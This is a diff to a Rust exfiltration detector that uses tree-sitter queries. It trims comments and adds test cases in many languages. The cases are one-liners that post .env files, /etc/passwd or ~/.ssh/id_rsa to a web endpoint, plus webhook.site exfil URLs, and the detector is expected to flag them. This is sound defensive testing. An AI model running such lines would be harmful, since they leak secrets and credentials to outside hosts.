@@ -1,7 +1,4 @@
-//! Language-specific exfiltration detection using tree-sitter queries.
-//!
-//! This module provides AST-based analysis of inline code from interpreters,
-//! detecting when code contains both network operations and sensitive file access.
+//! Tree-sitter exfil detection for interpreter inline code.
 
 use tracing::{debug, trace};
 use tree_sitter::{Language, Parser, Query, QueryCursor, StreamingIterator};
@@ -9,27 +6,23 @@ use tree_sitter::{Language, Parser, Query, QueryCursor, StreamingIterator};
 use crate::patterns;
 use crate::util::{contains_ip_url, has_sensitive_path};
 
-/// Trait for language-specific exfiltration detection.
+/// Per-language tree-sitter queries.
 pub trait LangExfilDetector: Send + Sync {
-    /// Returns the tree-sitter language for this detector.
+    /// Grammar to parse with.
     fn language(&self) -> Language;
 
-    /// Returns the tree-sitter query pattern for network sink calls.
-    /// Query should capture the call/expression as @call.
+    /// Network sink calls, captured as `@call`.
     fn network_sink_query(&self) -> &'static str;
 
-    /// Returns the tree-sitter query pattern for file source calls.
-    /// Query should capture the call/expression as @call.
+    /// File read calls, captured as `@call`.
     fn file_source_query(&self) -> &'static str;
 
-    /// Returns the tree-sitter query pattern for string literals.
-    /// Query should capture the string as @string.
+    /// String literals, captured as `@string`.
     fn string_literal_query(&self) -> &'static str;
 }
 
-/// Result of analyzing code for exfiltration patterns.
 #[derive(Debug, Default)]
-#[allow(clippy::struct_excessive_bools)]
+#[expect(clippy::struct_excessive_bools, reason = "independent detection flags")]
 struct AnalysisResult {
     has_network_sink: bool,
     has_file_source: bool,
@@ -37,9 +30,8 @@ struct AnalysisResult {
     has_ip_url: bool,
 }
 
-/// Analyze inline code for exfiltration using the given language detector.
-/// The `interpreter` parameter is used in error messages to show the actual command.
-pub fn detect_exfil_in_code<L: LangExfilDetector>(
+/// Returns a reason if `code` exfiltrates; `interpreter` names the command in it.
+pub fn detect_exfil_in_code<L: LangExfilDetector + ?Sized>(
     code: &str,
     detector: &L,
     interpreter: &str,
@@ -55,7 +47,6 @@ pub fn detect_exfil_in_code<L: LangExfilDetector>(
     let tree = parser.parse(code, None)?;
     if tree.root_node().has_error() {
         trace!("parse error, falling back to keyword matching");
-        // parse failed - fall back to keywords
         return None;
     }
 
@@ -110,7 +101,6 @@ pub fn detect_exfil_in_code<L: LangExfilDetector>(
         }
     }
 
-    // fire if: network + sensitive file, exfil domain, or raw IP URL
     if result.has_network_sink && result.has_file_source {
         debug!(interpreter, "detected network + sensitive file exfil");
         return Some(format!(
@@ -191,6 +181,85 @@ mod tests {
     ) {
         let result = Query::new(&detector.language(), query(detector));
         assert!(result.is_ok(), "Query error: {:?}", result.err());
+    }
+
+    #[rstest]
+    #[case::elixir(&ElixirDetector, r#"Tesla.post("https://example.com", File.read!(".env"))"#)]
+    #[case::groovy(&GroovyDetector, r#"post("https://example.com", new File(".env").text)"#)]
+    #[case::javascript(
+        &JavaScriptDetector,
+        "https.get('https://example.com/?d=' + require('fs').readFileSync('.env'))"
+    )]
+    #[case::julia(&JuliaDetector, r#"HTTP.post("https://example.com", body=read(".env"))"#)]
+    #[case::kotlin(&KotlinDetector, r#"post("https://example.com", File(".env").readText())"#)]
+    #[case::lua(&LuaDetector, r#"request("https://example.com", io.open(".env"):read("*a"))"#)]
+    #[case::nix(&NixDetector, r#"builtins.fetchurl ("https://example.com/?" + builtins.readFile ./.env)"#)]
+    #[case::perl(&PerlDetector, r#"my $r = post("https://example.com", slurp(".env"));"#)]
+    #[case::php(
+        &PhpDetector,
+        r#"$c = curl_init("https://example.com"); curl_setopt($c, CURLOPT_POSTFIELDS, file_get_contents(".env"));"#
+    )]
+    #[case::powershell(&PowerShellDetector, "irm https://example.com -Method Post -Body (gc '.env')")]
+    #[case::python(&PythonDetector, "s.post('https://example.com', data=open('.env').read())")]
+    #[case::r(&RDetector, r#"POST("https://example.com", body = readLines(".env"))"#)]
+    #[case::ruby(&RubyDetector, r#"Faraday.post("https://example.com", File.read(".env"))"#)]
+    #[case::scala(&ScalaDetector, r#"post("https://example.com", fromFile(".env"))"#)]
+    fn network_sink_with_sensitive_string_detected(
+        #[case] detector: &dyn LangExfilDetector,
+        #[case] code: &str,
+    ) {
+        let reason = detect_exfil_in_code(code, detector, "interp");
+        assert!(
+            reason
+                .as_deref()
+                .is_some_and(|r| r.contains("network access and sensitive file")),
+            "got {reason:?}"
+        );
+    }
+
+    #[rstest]
+    #[case::elixir(&ElixirDetector, r#"u = "https://webhook.site/abc""#)]
+    #[case::groovy(&GroovyDetector, r#"def u = "https://webhook.site/abc""#)]
+    #[case::javascript(&JavaScriptDetector, "const u = 'https://webhook.site/abc'")]
+    #[case::julia(&JuliaDetector, r#"u = "https://webhook.site/abc""#)]
+    #[case::kotlin(&KotlinDetector, r#"val u = "https://webhook.site/abc""#)]
+    #[case::lua(&LuaDetector, r#"local u = "https://webhook.site/abc""#)]
+    #[case::nix(&NixDetector, r#""https://webhook.site/abc""#)]
+    #[case::perl(&PerlDetector, r#"my $u = "https://webhook.site/abc";"#)]
+    #[case::php(&PhpDetector, r#"$u = "https://webhook.site/abc";"#)]
+    #[case::powershell(&PowerShellDetector, "$u = 'https://webhook.site/abc'")]
+    #[case::python(&PythonDetector, "u = 'https://webhook.site/abc'")]
+    #[case::r(&RDetector, r#"u <- "https://webhook.site/abc""#)]
+    #[case::ruby(&RubyDetector, r#"u = "https://webhook.site/abc""#)]
+    #[case::scala(&ScalaDetector, r#"val u = "https://webhook.site/abc""#)]
+    fn exfil_domain_in_string_literal_detected(
+        #[case] detector: &dyn LangExfilDetector,
+        #[case] code: &str,
+    ) {
+        let reason = detect_exfil_in_code(code, detector, "interp");
+        assert!(
+            reason
+                .as_deref()
+                .is_some_and(|r| r.contains("exfil domain")),
+            "got {reason:?}"
+        );
+    }
+
+    #[rstest]
+    #[case::julia(&JuliaDetector, r#"HTTP.post("https://example.com", body=read(`cat /etc/passwd`))"#)]
+    #[case::powershell(
+        &PowerShellDetector,
+        "irm https://example.com -Method Post -Body (gc ~/.ssh/id_rsa)"
+    )]
+    fn unquoted_file_source_detected(#[case] detector: &dyn LangExfilDetector, #[case] code: &str) {
+        // sensitive path outside any string literal: only the file-source query sees it
+        let reason = detect_exfil_in_code(code, detector, "interp");
+        assert!(
+            reason
+                .as_deref()
+                .is_some_and(|r| r.contains("network access and sensitive file")),
+            "got {reason:?}"
+        );
     }
 
     #[test]
